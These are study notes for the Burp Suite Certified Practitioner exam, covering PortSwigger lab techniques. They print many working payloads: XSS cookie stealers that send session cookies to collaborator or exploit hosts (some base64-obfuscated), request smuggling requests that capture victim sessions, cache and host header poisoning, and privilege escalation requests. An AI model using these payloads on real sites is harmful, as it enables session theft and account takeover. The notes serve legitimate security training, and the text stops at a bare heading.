
# Burp Suite Certified Practitioner Exam Study  

>My study notes on the PortSwigger Academy [Burp Suite Certified Practitioner](https://portswigger.net/web-security/certification) (BSCP) Exam topics. Go to [PortSwigger Academy](https://portswigger.net/web-security/all-materials) learning materials to get more detail.  
  
**[Foothold](#foothold)**  
[Dom-XSS](#dom-based-xss)  
[Cross Site Scripting](#cross-site-scripting)  
[Web Cache Poison](#web-cache-poison)  
[Host Header Poison](#host-header-poison---forgot-password)  
[HTTP Request Smuggling](#http-request-smuggling)  
[Brute force](#brute-force)  
  
**[Privilege Escalation](#privilege-escalation)**  
[JSON roleid PrivEsc](#privesc-json-roleid)  
[CSRF Account Takeover](#csrf-account-takeover)  
[SQLi Admin Credential Exfil](#sql-injection)  
[JSON Web Tokens](#jwt)  
  
**[Data Exfiltration](#data-exfiltration)**  
[XML entities & Injections](#xxe-injections)  
[SSRF Server side request forgery](#ssrf---server-side-request-forgery)  
[SSTI Server side template injection](#ssti---server-side-template-injection)  
[Prototype pollution](#prototype-pollution)  
[Cross Site Request Forgery](#csrf)  
[File path traversal](#file-path-traversal)  
[File Uploads](#file-uploads)  
[Deserialization](#deserialization)  
  
**[Appendix](#appendix)**  
[Solve Labs with Python](#solve-labs-with-python)  
[Payloads](payloads/README.md)  
[Wordlists](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main/wordlists)  
[Focus target scanning](#focus-scanning)  
[Approach](#approach)  
[Youtube Study Playlist](#youtube-training-playlist)  

# Foothold  
  
## DOM-Based XSS  

>DOM-based XSS vulnerabilities arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes code to a sink that supports dynamic code execution. Review the code to ***identify*** the **sources** and **sinks** that may lead to exploit, list of examples:  

* document.write
* window.location
* document.cookie
* eval()
* document.domain
* WebSocket
* element.src
* postmessage
* setRequestHeader
* JSON.parse
* ng-app
* URLSearchParams
* replace()
* innerHTML
* location.search
* addEventListener  
  
>AngularJS expression below can be injected into the search function when angle brackets and double quotes HTML-encoded. The vulnerability is ***identified*** by noticing the search string is enclosed in an **ng-app** directive and ```/js/angular 1-7-7.js``` script. Review the HTML code to ***identify*** ng-app directive telling AngularJS that this is the root element of the AngularJS application.  

![domxss-on-constructor.png](images/ng-app-code-review.png)  

>PortSwigger lab payload below:

```JavaScript
{{$on.constructor('alert(1)')()}}
```  

>Cookie stealer payload that can be placed in iframe, hosted on an exploit server, resulting in the victim session cookie being send to Burp Cllaborator.  

```JavaScript
{{$on.constructor('document.location="https://COLLABORATOR.com?c="+document.cookie')()}}
```  

>Note: the cookie property must to have **HttpOnly** secure flag set.  

![domxss-on-constructor.png](images/domxss-on-constructor.png)  

[PortSwigger Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression)  

>Below the target is vulnerable to dom-xss in the stock check function. Document.write is the sink used with location.search allowing us to add new value to Javascript variable **storeId**.  

```html
/product?productId=1&storeId="></select><img%20src=1%20onerror=alert(document.cookie)>  
```  

![get-dom-xss.png](images/get-dom-xss.png)  

>Dom-based XSS request with inserted malicious code into the variable read by the target JavaScript.  

![dom-xss](images/dom-xss.png)  

[PortSwigger Lab: DOM XSS in document.write sink using source location.search inside a select element](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element)  

### Dom Invader  

>Using Dom Invader plugin and set the canary to value, such as 'domxss' and detect DOM-XSS sinks that can be exploit.  

![DOM Invader](images/dom-invader.png)  

### DOM XSS JSON.parse web messages    

>Target use web messaging and parses the message as JSON. Exploiting the vulnerability by constructing an HTML page on the exploit server that exploits DOM XSS vulnerability and steal victim cookie.  


>The vulnerable JavaScript code on the target using event listener that listens for a web message. This event listener expects a **string** that is parsed using **JSON.parse()**. In the JavaScript below, we can see that the event listener expects a **type** property and that the **load-channel** case of the **switch** statement changes the **img src** attribute.  

>***Identify*** web messages on target that is using **postmessage()** with **DOM Invader**.  

```JavaScript
<script>
	window.addEventListener('message', function(e) {
		var img = document.createElement('img'), ACMEplayer = {element: img}, d;
		document.body.appendChild(img);
		try {
			d = JSON.parse(e.data);
		} catch(e) {
			return;
		}
		switch(d.type) {
			case "page-load":
				ACMEplayer.element.scrollIntoView();
				break;
			case "load-channel":
				ACMEplayer.element.src = d.url;
				break;
			case "player-height-changed":
				ACMEplayer.element.style.width = d.width + "px";
				ACMEplayer.element.style.height = d.height + "px";
				break;
			case "redirect":
				window.location.replace(d.redirectUrl);
				break;
		}
	}, false);
</script>
```  

>To exploit the above code, inject JavaScript into the **JSON** data to change "load-channel" field data and steal document cookie.  
  
>Host an **iframe** on the exploit server html body, and send it to the victim, resulting in the stealing of their cookie. The victim cookie is sned to the Burp collaboration server.  

```html
<iframe src=https://TARGET.net/ onload='this.contentWindow.postMessage(JSON.stringify({
    "type": "load-channel",
    "url": "JavaScript:document.location='https://COLLABORATOR.com?c='+document.cookie"
}), "*");'>

```  

>At the end of the iframe onload values is a "*", this is to indicate the target is any.  


[PortSwigger Lab: DOM XSS using web messages and JSON.parse](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse)  

![DOM Invader identify web messages](images/dom-invader-identify-web-messages.png)  

>Replay the post message using DOM Invader after altering the JSON data.  

```JSON
{
    "type": "load-channel",
    "url": "JavaScript:document.location='https://COLLABORATOR.com?c='+document.cookie"
}
```  

![DOM Invader resend web messages](images/dom-invader-resend-web-messages.png)  
  
[PortSwigger: Identify DOM XSS using PortSwigger DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/web-messages)  
  
## Cross Site Scripting  

>XSS Resources pages to lookup payloads for **tags** and **events**.   

+ [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
+ [PayloadsAllTheThings (XSS)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#xss-in-htmlapplications)  

>CSP Evaluator tool to check if content security policy is in place to mitigate XSS attacks.

+ [CSP Evaluator](https://csp-evaluator.withgoogle.com/)  
  
>Set a test unsecure cookie in browser dev tools to test POC XSS cookie stealer payload on myself.  

```JavaScript
document.cookie = "TopSecret=UnSafeCookieSessionValueForTopSecretCookie";
```
  
### XSS Tags & Events  

>This section give guide to ***identify*** reflected XSS in a **search** function on a target and how to determine the HTML tags and events attributes not blocked.  
  
>The tag **Body** and event **onresize** is the only allowed, providing an injection to perform XSS.  

```JavaScript
?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```  

>Again the **Body** and event **onpopstate** is not blocked.  
  
```JavaScript
?search=%22%3E%3Cbody%20onpopstate=print()>
```  

[PortSwigger Cheat-sheet XSS Example: onpopstate event](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onpopstate)  

>Below JavaScript is hosted on exploit server and then deliver to victim. It is an iframe doing **onload** and the search parameter is vulnerable to **onpopstate**.  

```JavaScript
<iframe onload="if(!window.flag){this.contentWindow.location='https://TARGET.net?search=<body onpopstate=document.location=`http://COLLABORATOR.com/?`+document.cookie>#';flag=1}" src="https://TARGET.net?search=<body onpopstate=document.location=`http://COLLABORATOR.com/?`+document.cookie>"></iframe>
```  

### OnHashChange  

>Below iframe uses **hash** character at end of URL to trigger the **OnHashChange** XSS cookie stealer.  
  
```JavaScript
<iframe src="https://TARGET.net/#" onload="document.location='http://COLLABORATOR.com/?cookies='+document.cookie"></iframe>
```  

>Note if the cookie is secure with **HttpOnly** flag set enabled, the cookie cannot be stolen using XSS.  

>PortSwigger Lab payload perform print.  

```JavaScript
<iframe src="https://TARGET.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```  

>Note: ***Identify*** in below lab the vulnerable jquery 1.8.2 version used with the CSS selector to identify **hashchange**.  

![Hashchange](images/hashchange.png)  

[PortSwigger Lab: DOM XSS in jQuery selector sink using a hashchange event](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event)  


[Crypto-Cat: DOM XSS in jQuery selector sink using a hashchange event](https://github.com/Crypto-Cat/CTF/blob/main/web/WebSecurityAcademy/xss/dom_xss_jquery_hashchange/writeup.md)  

### Methodology to identify allowed XSS Tags  

>The below lab gives great **Methodology** to identify allowed HTML tags and events for crafting POC XSS.  

[PortSwigger Lab: Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)  
  
>Host **iframe** code on exploit server and deliver exploit link to victim.  

```html
<iframe src="https://TARGET.web.net/?search=%22%3E%3Cbody%20onpopstate=print()%3E">  
```  

### Reflected XSS (Cookie Stealers)  

>In the **Search** function a Reflected XSS vulnerability is identified. The attacker then deliver an exploit link to victim with cookie stealing payload in a hosted **iframe** on their exploit server.  

>***Identify*** The search JavaScript code on the target, return a JSON response. Validate that the backslash **\\** escape is not sanitized, and the JSON data is then send to **eval()**.  Backslash is not escaped correct and when the JSON response attempts to escape the opening double-quotes character, it adds a second backslash. The resulting double-backslash causes the escaping to be effectively canceled out.  

```JavaScript
\"-fetch('https://Collaborator.com?cs='+btoa(document.cookie))}//
```  

>Image show the request using search function to send the document.cookie value in base64 to collaboration server.  

![Reflected dom-xss json cookie stealer](images/reflected-dom-xss-json-cookie-stealer.png)  

[PortSwigger Lab: Reflected DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected)  

### XSS WAF Bypass  

>WAF is preventing dangerous search filters and tags, then bypass XSS filters using JavaScript global variables.  

```JavaScript
"-alert(window["document"]["cookie"])-"
"-window["alert"](window["document"]["cookie"])-"
"-self["alert"](self["document"]["cookie"])-"
```  

[secjuice: Bypass XSS filters using JavaScript global variables](https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/)  
  
```JavaScript
fetch("https://Collaborator.oastify.com/?c=" + btoa(document['cookie']))
```
>Base64 encode the payload.  

```
ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20vP2M9IiArIGJ0b2EoZG9jdW1lbnRbJ2Nvb2tpZSddKSk=
```  

>Test payload on our own session in Search.  

```JavaScript
"+eval(atob("ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20vP2M9IiArIGJ0b2EoZG9jdW1lbnRbJ2Nvb2tpZSddKSk="))}//
```  

+ Using the **eval()** method evaluates or executes an argument. 
+ Using **atob()** or **btoa()** is function used for encoding to and from base64 formated strings.
+ If **eval()** being blocked then Alternatives:
  + setTimeout("code")
  + setInterval("code)
  + setImmediate("code")
  + Function("code")()
  
>The image below shows Burp Collaborator receiving the victim cookie as a base64 result.  

![Burp collaborator receiving request with base64 cookie value from our POC.](images/xss2.png)  

>Hosting the **IFRAME** with eval() and fetch() payload on exploit server, respectively base64 encoded and URL encoded.  

```html
<iframe src="https://TARGET.web-security-academy.net/?SearchTerm=%22%2b%65%76%61%6c%28%61%74%6f%62%28%22%5a%6d%56%30%59%32%67%6f%49%6d%68%30%64%48%42%7a%4f%69%38%76%4f%44%4d%35%59%32%74%30%64%54%64%31%62%32%64%6c%5a%47%30%32%59%54%46%72%61%6e%56%35%4d%32%39%31%64%47%78%36%59%32%34%79%59%6e%49%75%62%32%46%7a%64%47%6c%6d%65%53%35%6a%62%32%30%76%50%32%4d%39%49%69%41%72%49%47%4a%30%62%32%45%6f%5a%47%39%6a%64%57%31%6c%62%6e%52%62%4a%32%4e%76%62%32%74%70%5a%53%64%64%4b%53%6b%3d%22%29%29%7d%2f%2f"/>
```
![(Deliver reflected xss to steal victim cookie.](images/xss1.png)  

>Decode above payload from url encoding, is the following:  

```html
https://TARGET.web-security-academy.net/?SearchTerm="+eval(atob("ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20vP2M9IiArIGJ0b2EoZG9jdW1lbnRbJ2Nvb2tpZSddKSk="))}//  
```  

>Decode part of payload above that is base64 encoded to the following:  

```html
https://TARGET.web-security-academy.net/?SearchTerm="+eval(atob("fetch("https://839cktu7uogedm6a1kjuy3outlzcn2br.oastify.com/?c=" + btoa(document['cookie']))"))}//  
```  
  
#### URL & Base64 encoders and decoders  

[URL Decode and Encode](https://www.urldecoder.org/)  
[BASE64 Decode and Encode](https://www.base64encode.org/)    
  
### Stored XSS

>Use following sample code to ***identify*** stored XSS, if stored input is redirecting victim that click or following the links to our exploit server.  

```HTML
<img src="https://EXPLOIT.net/img">
<script src="https://EXPLOIT.net/script"></script>
<video src="https://EXPLOIT.net/video"></video>
```  
  
>Below is log of requests to exploit log server showing which of the above tags worked.  

![Identify-stored-xss](images/identify-stored-xss.png)  

>Cross site Scriting saved in Blog post comment. This Cookie Stealer payload then send the victim session cookie to the exploit server logs.  

```html
<img src="1" onerror="window.location='https://exploit.net/cookie='+document.cookie">
```  

>Product and Store lookup  

```html
?productId=1&storeId="></select><img src=x onerror=this.src='https://exploit.net/?'+document.cookie;>
```  

>Stored XSS Blog post  

```JavaScript
<script>
document.write('<img src="https://exploit.net?cookieStealer='+document.cookie+'" />');
</script>
```  

>Below target has a stored XSS vulnerability in the blog comments function. Exfiltrate a victim user session cookie that views comments after they are posted, and then use their cookie to do impersonation.  

![Stored XSS Blog post](images/stored-xss-blog-post.png)  

>**Fetch API** JavaScript Cookie Stealer payload in Blog post comment.  

```JavaScript
<script>
fetch('https://exploit.net', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```  

[PortSwigger Lab: Exploiting cross-site scripting to steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)  
  
## Web Cache Poison  

>Target use **tracking.js** JavaScript, and is vulnerable to **X-Forwarded-Host** or **X-Host** header redirecting path, allowing the stealing of cookie by poisoning cache.
>***Identify*** the web cache headers in response and the tracking.js script in the page source code. Exploit the vulnerability by hosting JavaScript and injecting the header to poison the cache of the target to redirect a victim visiting.  

![Tracking Source code review](images/tracking-code-review.png)  
  
```html
X-Forwarded-Host: EXPLOIT.net
X-Host: EXPLOIT.net
```  

![tracking.js](images/tracking.js.png)  

>Hosting on the exploit server, injecting the **X-Forwarded-Host** header in request, and poison the cache until victim hits poison cache.  

```
/resources/js/tracking.js
```  
  
![exploit host tracking.js](images/exploit-host-tracking-js.png)  
  
>Body  
  
```javascript
document.location='https://collaboration.net/?cookies='+document.cookie;
```  

>Keep **Poisoning** the web cache of target by resending request with **X-Forwarded-Host** header.  

![x-cache-hit.png](images/x-cache-hit.png)  

[PortSwigger Lab: Web cache poisoning with an unkeyed header](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header)  

>Youtube video showing above lab payload on exploit server modified to steal victim cookie when victim hits a cached entry on backend server. The payload is the above JavaScript.  

[YouTube: Web cache poisoning with unkeyed header - cookie stealer](https://youtu.be/eNmF8fq-ur8)  
  
[Param Miner Extension to identify web cache vulnerabilities](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943)  
  
### utm_content  

>Target is vulnerable to web cache poisoning because it excludes a certain parameter from the cache key. Param Miner's "Guess GET parameters" feature will ***identify*** the parameter as utm_content.  

![Cache query reflected](images/cache-query-reflected.png)  
  
```
GET /?utm_content='/><script>document.location="https://Collaborator.com?c="+document.cookie</script>
```  

>Above payload is cached and the victim visiting target cookie send to Burp collaborator.  

![cache-collaborator.png](images/cache-collaborator.png)  

[PortSwigger Lab: Web cache poisoning via an unkeyed query parameter](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-param)  

### Poison ambiguous request  

>Adding a second **Host** header with an exploit server, this identify a ambiguous cache vulnerability and routing your request. Notice thast the exploit server in second **Host** header is reflected in an absolute URL used to import a script from ```/resources/js/tracking.js```. 

```html
GET / HTTP/1.1
Host: TARGET.web-security-academy.net
Host: exploit-target.exploit-server.net
```

>Place the JavaScript code to perform a cookie stealer on exploit server.  

```
document.location='https://Collaborator.com/?cookies='+document.cookie;
```  

![Ambiguous Hosts](images/ambiguous-hosts.png)  

[PortSwigger Lab: Web cache poisoning via ambiguous requests](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests)  

## Host Header Poison - forgot-password

### Spoof IP Address  

>***Identify*** that altered HOST headers are supported, which allows you to spoof your IP address and bypass the IP-based brute-force protection or redirection attacks to do password reset poisoning.  
  
>Change the username parameter to carlos and send the request.  

```html
X-Forwarded-Host: EXPLOIT.net
X-Host: EXPLOIT.net
X-Forwarded-Server: EXPLOIT.net
```  

>Check the exploit server log to obtain the reset link to the victim username.  
  
![Exploit Server Logs capture the forgot password reset token](images/HOST-Header-forgot-password-reset.PNG)  

[PortSwigger Lab: Password reset poisoning via middleware](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware)  

### HOST Connection State  

>Target is vulnerable to routing-based SSRF via the Host header. Sending grouped request in sequence using **single connection** and setting the connection header to **keep-alive**, bypass host header validation and enable SSRF exploit of local server.  

```html
GET /intranet/service HTTP/1.1
Host: TARGET.web-security-academy.net
Cookie: session=vXAA9EM1hzQuJwHftcLHKxyZKtSf2xCW
Content-Length: 48
Content-Type: text/plain;charset=UTF-8
Connection: keep-alive
```  

>Next request is the second tab in group sequence of requests.  

```html
POST /service/intranet HTTP/1.1
Host: localhost
Cookie: _lab=YOUR-LAB-COOKIE; session=YOUR-SESSION-COOKIE
Content-Type: x-www-form-urlencoded
Content-Length: 53

csrf=YOUR-CSRF-TOKEN&username=carlos
```  

>Observe that the second request has successfully accessed the admin panel.  

![single connection](images/single-connection.png)  

[PortSwigger Lab: Host validation bypass via connection state attack](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-host-validation-bypass-via-connection-state-attack)  


## HTTP Request Smuggling  

>Architecture with front-end and back-end server, and front-end or backend does not support chunked encoding **(HEX)** or content-length **(Decimal)**. Bypass security controls to retrieve the victim's request and use the victim user's cookies to access their account.  

### TE.CL multiCase - Transfer-Encoding
  
>Manually fixing the length fields in request smuggling attacks, requires each chunk size in bytes expressed in **HEXADECIMAL**, and **Content-Length** specifies the length of the message body in **bytes**. Chunks are followed by a **newline**, then followed by the chunk contents. The message is terminated with a chunk of size ZERO.  

![TE-CL-http-request-smuggle.png](images/TE-CL-http-request-smuggle.png)  

>**Note:** In certain smuggle vulnerabilities, go to Repeater menu and ensure the **"Update Content-Length"** option is unchecked.  

```
POST / HTTP/1.1
Host: TARGET.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked

71
GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0  
  
```  

>**Note:** include the trailing sequence \r\n\r\n following the final 0.  

>Calculating TE.CL (Transfer-Encoding / Content-Length) smuggle request length in **HEXADECIMAL** and the payload is between the hex length of **71** and the terminating **ZERO**, not including the ZERO AND not the preceding \r\n on line above ZERO, as part of length. The inital POST request **content-length** is manually set.  
  
[TJCHacking - Request Smuggling Calculator](https://github.com/tjcim/request_smuggling_calculator)  
  
[PortSwigger Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl)  


### CL.TE multiCase - Content-Length

>Large Content-Length to capture victim requests. Sending a POST request with smuggled request but the content length is longer than the real length and when victim browse their cookie session value is posted to blob comment. Increased the comment-post request's Content-Length to **798**, then smuggle POST request to the back-end server.

```html
POST / HTTP/1.1
Host: TARGET.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 242
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 798
Cookie: session=HackerCurrentCookieValue

csrf=ValidCSRFCookieValue&postId=8&name=c&email=c%40c.c&website=&comment=c
```  
  
![Exploiting HTTP request smuggling with content-length value](images/content-length-capture-victim-request.png)  

>No new line at end of the smuggled POST request above^^.  

>View the blog **post** to see if there's a comment containing a user's request. Note that once the victim user browses the target website, then only will the attack be successful. Copy the user's Cookie header from the blog post comment, and use the cookie to access victim's account.  
  
![Exploiting HTTP request smuggling to capture other users' requests](images/victim-request-captured-blog-comment.png)  

[PortSwigger Lab: Exploiting HTTP request smuggling to capture other users' requests](https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests)  


### CL.TE multiCase - User-Agent Cookie Stealer

>***Identify*** the UserAgent value is stored in the GET request loading the blog comment form, and stored in **User-Agent** hidden value. Exploiting HTTP request smuggling to deliver reflected XSS using **User-Agent** value that is then placed in a smuggled request.  

>Basic Cross Site Scripting Payload escaping out of HTML document.  

```JavaScript
 "/><script>alert(1)</script>
```

>COOKIE STEALER Payload.  

```JavaScript
a"/><script>document.location='http://Collaborator.com/?cookiestealer='+document.cookie;</script>
```  

>Smuggle this XSS request to the back-end server, so that it exploits the next visitor. Place the XSS cookie stealer in **User-Agent** header.  

```html
POST / HTTP/1.1
Host: TARGET.websecurity.net
Content-Length: 237
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /post?postId=4 HTTP/1.1
User-Agent: a"/><script>document.location='http://COLLABORATOR.com/?Hack='+document.cookie;</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
```  

![HTTP request smuggling to deliver reflected XSS and steal victim cookie](images/user-agent-cookie-stealer-smuggled.PNG)  

>Check the PortSwigger Collaborator Request received from victim browsing target.  
  
![Collaborator capture xss Request from victim browsing target](images/collaborator-xss-Request-received.png)  

[PortSwigger Lab: Exploiting HTTP request smuggling to deliver reflected XSS](https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss)  

### TE.CL dualchunk - Transfer-encoding obfuscated  

>If Duplicate header names are allowed, and the vulnerability is detected as **dualchunk**, then add an additional header with name and value = **Transfer-encoding: cow**.  Use **obfuscation** techniques with second TE.  

```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked

Transfer-encoding: identity
Transfer-encoding: cow
```  

>Some servers that do support the Transfer-Encoding header can be induced not to process it if the header is **obfuscation** in some way.  

>On Repeater menu ensure that the **"Update Content-Length"** option is unchecked.  

```html
POST / HTTP/1.1
Host: TARGET.websecurity-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: identity

e6
GET /post?postId=4 HTTP/1.1
User-Agent: a"/><script>document.location='http://COLLAB.com/?c='+document.cookie;</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0\r\n  
\r\n
  
```  

![gpost Obfuscating the TE header](images/gpost.png)  

>**Note:** You need to include the trailing sequence **\r\n\r\n** following the final **0**.  

[PortSwigger Lab: HTTP request smuggling, obfuscating the Transfer-Encoding (TE) header](https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header)  
  
>Wonder how often this scenario occur that hacker is able to steal visiting user request via HTTP Sync vulnerability?  
  
### HTTP/2 smuggling via CRLF injection  

>Target is vulnerable to request smuggling because the front-end server **downgrades HTTP/2** requests and fails to adequately sanitize incoming headers. Exploitation is by use of an HTTP/2-exclusive request smuggling vector to steal a victims session cookie and gain access to user's account.  

>***Identify*** possible vulnerability when Target reflect previous and recent search history based on cookie, by removing cookie it is noticed that your search history is reset, confirming that it's tied to your session cookie.  

![recent-searchs](images/recent-searchs.png)  

>Expand the Inspector's Request Attributes section and change the protocol to HTTP/2, then append arbitrary header ```foo``` with value ```bar```, follow with the sequence ```\r\n```, then followed by the ```Transfer-Encoding: chunked```, by pressing **shift+ENTER**.  

![http2-inspector](images/http2-inspector.png)  

>Note: enable the **Allow HTTP/2 ALPN override** option and change the body of HTTP/2 request to below POST request.  

```html
0

POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=HACKER-SESSION-COOKIE
Content-Length: 800

search=nutty
```  
  
![http2 smuggle via crlf inject](images/http2-smuggle-via-crlf-inject.png)  
  
[PortSwigger Lab: HTTP/2 request smuggling via CRLF injection](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-smuggling-via-crlf-injection)  
  
[Youtube demo HTTP/2 request smuggling via CRLF injection](https://youtu.be/E-bnCGzl7Rk)  

### HTTP/2 TE desync v10a h2path

>Target is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length. Steal the  session cookie, of the admin visiting the target. The Burp extension, **HTTP Request Smuggler** will ***identify*** the vulnerability as HTTP/2 TE desync v10a (H2.TE) vulnerability.  

![HTTP/2 TE desync v10a h2path](images/HTTP2-TE-desync-v10a-h2path.png)  

>Note: Switch to **HTTP/2** in the inspector request attributes and Enable the **Allow HTTP/2 ALPN override** option in repeat menu.  

```html
POST /x HTTP/2
Host: TARGET.web-security-academy.net
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: TARGET.web-security-academy.net\r\n
\r\n
```  

>Note: Paths in both POST and GET requests points to non-existent endpoints. This help to ***identify*** when not getting a 404 response, the response is from victim user captured request. **Remember** to terminate the smuggled request properly by including the sequence ```\r\n\r\n``` after the Host header.  

![302 Response once stolen admin cookie request captured](images/302-stolen-admin-cookie.png)  

>Copy stolen session cookie value into new **http/2** GET request to the admin panel.  

```
GET /admin HTTP/2
Host: TARGET.web-security-academy.net
Cookie: session=VictimAdminSessionCookieValue
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="109", "Not_A Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
```  

![admin-panel-access](images/admin-panel-access.png)  

[PortSwigger Lab: Response queue poisoning via H2.TE request smuggling](https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling)  
  

## Brute Force  

### Stay-Logged-in  

>Login option with a stay-logged-in checkbox result in Cookie value containing the password of the user logged in and is vulnerable to brute-forcing.  

![stay-logged-in](images/stay-logged-in.png)  

>Intruder Payload processing, add grep option and the following rules in sequenctial order before attack is submitted.  
  
1. Hash: MD5  
2. Add prefix: carlos:  
3. Encode: Base64-encode.  
  
```bash
grep 'Update email'
```  

![brute](images/brute.png)  

[PortSwigger Lab: Brute-forcing a stay-logged-in cookie](https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie)  
  
### Brute Force Protected Login  

>Identified brute force protection on login when backend enforce 30 minute ban. Testing ```X-Forwarded-For:``` header result in bypass of brute force protection. Observing the response time with long invalid password, mean we can use **Pitchfork** technique to identify first valid usernames with random long password and then rerun intruder with **Pitchfork**, set each payload position attack iterates through all sets simultaneously.  

[Burp Lab Username, Password and directory fuzzing Wordlists](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main/wordlists)  

>Payload position 1 on IP address for ```X-Forwarded-For:``` and position 2 on username with a long password to see the response time delay in attack columns window.  

![Intruder Pitchfork](images/pitchfork.png)  

[PortSwigger Lab: Username enumeration via response timing](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing)  
  
# Privilege Escalation  
  
## PrivEsc JSON RoleId  

>Access control to the admin interface is based on user roles, and this can lead to privilege escalation or accessc ontrol security vulnerability.  

>Capture current logged in user email change submission request and send to **Intruder**, then add ```"roleid":§99§``` into the JSON body of the request, and fuzz the possible roleid value for administrator access role.  

```html
POST /my-account/change-email HTTP/1.1
Host: TARGET.web-security-academy.net
Cookie: session=vXAA9EM1hzQuJwHftcLHKxyZKtSf2xCW
Content-Length: 48
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Connection: close

{
 "email":"newemail@wiener.peter",
 "roleid": 42
}
```  

>The Hitchhiker's Guide to the Galaxy answer was [42](https://en.wikipedia.org/wiki/Phrases_from_The_Hitchhiker%27s_Guide_to_the_Galaxy#42_Puzzle)  

![Intruder Payload set to identify Admin role ID](images/intruder-payload-positions.png)  

>Attacker ***identify*** the possible role ID of administrator role and then send this request with updated roleId to privilege escalate the current logged in user to the access role of administator.  

![Attack identify Admin role ID](images/admin-roleid-privesc.png)  

[PortSwigger Lab: User role can be modified in user profile](https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile)  

>Escalation to administrator is sometimes controlled by a role selector GET request, by **dropping** this GET request before it is presented to the user, the default role of admin is selected and access granted to the admin portal.  

![Select a role](images/select-a-role.png)  

[PortSwigger Lab: Authentication bypass via flawed state machine](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-flawed-state-machine)  
  
## CSRF Account Takeover  

>Cross-Site Request Forgery vulnerability allows an attacker to force users to perform actions that they did not intend to perform. This can enable attacker to change victim email address and use password reset to take over the account.  
  
### OAuth  

>oAuth linking exploit server hosting iframe, then deliver to victim, forcing user to update code linked.  

![csrf](images/csrf.png)  

>Intercepted the GET /oauth-linking?code=[...]. send to repeat to save code. Drop the request. Important to ensure that the code is not used and, remains valid. Save on exploit server an iframe in which the src attribute points to the URL you just copied.  

```html
<iframe src="https://TARGET.web-security-academy.net/oauth-linking?code=STOLEN-CODE"></iframe>
```  

[PortSwigger Lab: Forced OAuth profile linking](https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking)  
  
### Referer CSRF  

